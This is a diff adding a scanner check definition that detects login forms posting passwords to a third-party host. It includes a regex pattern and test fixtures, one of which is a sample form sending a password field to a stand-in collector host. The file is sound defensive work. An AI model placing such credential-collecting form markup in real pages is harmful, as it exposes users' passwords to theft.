@@ -1,0 +1,64 @@
+{
+  "schemaVersion": "drobon.pack.dast/v1",
+  "id": "DPK-DAST-319",
+  "title": "Password form submits to a third-party origin",
+  "description": "A form contains a password input and posts it to an absolute URL on another registrable host. Credentials the user types here are delivered to that host, and because the page is the application's own origin the user has no way to notice the destination changed.",
+  "severity": "MEDIUM",
+  "cwe": "CWE-200",
+  "category": "information-disclosure",
+  "remediation": "Post credentials only to the application origin (or a documented identity provider), and keep the action relative so a compromised template cannot redirect it.",
+  "limitation": "One response body. The check reads the form markup; it cannot tell an intentional federation redirect from an exfiltration form, which is why the finding names the destination rather than asserting an attack.",
+  "check": {
+    "type": "response-body-matches",
+    "valuePattern": "<form\\b[^>]{0,300}\\baction\\s*=\\s*[\"']https://(?!(?:www\\.)?app\\.example)[^\"']*[\"'](?=[\\s\\S]{0,800}type\\s*=\\s*[\"']password)|type\\s*=\\s*[\"']password[\"'][\\s\\S]{0,300}<form\\b[^>]{0,300}\\baction\\s*=\\s*[\"']https://(?!(?:www\\.)?app\\.example)"
+  },
+  "tests": [
+    {
+      "observation": {
+        "url": "https://app.example/login",
+        "status": 200,
+        "headers": {
+          "Content-Type": "text/html"
+        },
+        "body": "<form method=\"post\" action=\"https://collector.example/collect\"><input type=\"password\" name=\"pw\"></form>"
+      },
+      "match": true
+    },
+    {
+      "observation": {
+        "url": "https://app.example/login",
+        "status": 200,
+        "headers": {
+          "Content-Type": "text/html"
+        },
+        "body": "<input type=\"password\" name=\"pw\"><form action=\"https://sso.other.example/auth\" method=\"post\"></form>"
+      },
+      "match": true
+    },
+    {
+      "observation": {
+        "url": "https://app.example/login",
+        "status": 200,
+        "headers": {
+          "Content-Type": "text/html"
+        },
+        "body": "<form method=\"post\" action=\"/login\"><input type=\"password\" name=\"pw\"></form>"
+      },
+      "match": false
+    },
+    {
+      "observation": {
+        "url": "https://app.example/login",
+        "status": 200,
+        "headers": {
+          "Content-Type": "text/html"
+        },
+        "body": "<form action=\"https://search.example/q\"><input type=\"text\" name=\"q\"></form>"
+      },
+      "match": false
+    }
+  ],
+  "patternRefs": [
+    "DPK-PAT-1388"
+  ]
+}
